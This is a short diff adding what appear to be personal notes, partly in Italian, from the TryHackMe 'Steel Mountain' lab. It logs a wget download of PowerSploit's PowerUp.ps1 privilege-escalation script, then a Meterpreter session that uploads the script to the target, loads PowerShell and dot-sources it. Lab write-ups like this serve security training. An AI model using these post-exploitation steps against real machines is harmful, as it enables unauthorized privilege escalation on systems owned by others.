@@ -1,0 +1,24 @@
+non ha funzionato, riscaricato da qui
+
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
+--2021-05-08 12:21:29--  https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 600580 (587K) [text/plain]
+Saving to: ‘PowerUp.ps1’
+
+
+
+meterpreter > upload /opt/TryHackMe/steelmountain/PowerUp.ps1
+[*] uploading  : /opt/TryHackMe/steelmountain/PowerUp.ps1 -> PowerUp.ps1
+[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /opt/TryHackMe/steelmountain/PowerUp.ps1 -> PowerUp.ps1
+[*] uploaded   : /opt/TryHackMe/steelmountain/PowerUp.ps1 -> PowerUp.ps1
+meterpreter > powershell_shell
+[-] Unknown command: powershell_shell.
+meterpreter > load powershell
+Loading extension powershell...Success.
+meterpreter > powershell_shell
+PS > . .\PowerUp.ps1
+PS >
+
